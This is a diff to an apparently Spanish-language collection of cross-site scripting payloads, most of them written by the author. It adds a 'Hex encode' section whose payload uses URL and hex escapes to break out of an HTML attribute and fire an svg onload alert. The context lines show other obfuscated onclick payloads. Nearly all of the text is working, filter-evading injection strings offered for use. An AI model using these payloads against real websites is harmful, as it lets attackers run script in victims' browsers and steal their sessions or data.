@@ -10,6 +10,7 @@ La mayoria de los payloads aquí mostrados estan creados o modificados por mi.
    * [onMouseOver](#onMouseOver)
    * [input + onblur + Obfuscation](#input-+-onblur-+-Obfuscation)
    * [html + onclik + Alert Obfuscation](#html-+-onclik-+-Alert-Obfuscation)
+   * [Hex encode](#Hex-encode)
    * [Xss dentro de un botón en form](#Xss-dentro-de-un-botón-en-form)
    * [fake captcha](#fake-captcha)
    * [Img + Onerror](#Img-+-Onerror)
@@ -131,6 +132,11 @@ onMouseOver=<script>alert("/XSS BY Y000!/")</script>
 <p/onclick=%27new%20Function`al\ert\`\u0059\u0030\u0030\u0030\``%27>d
 
 <p/onclick=self[`aler`%2b`t`]`\u0059\u0030\u0030\u0030`>d
+```
+### Hex encode
+
+```
+%22%3E%3Csvg%20onload=self[%27\x61\x6c\x65\x72\x74%27](%27\x5f\x59\x30\x30\x30\x21\x5f\x0a%27)%3E_Y000!_
 ```
 
 ### Xss dentro de un botón en form
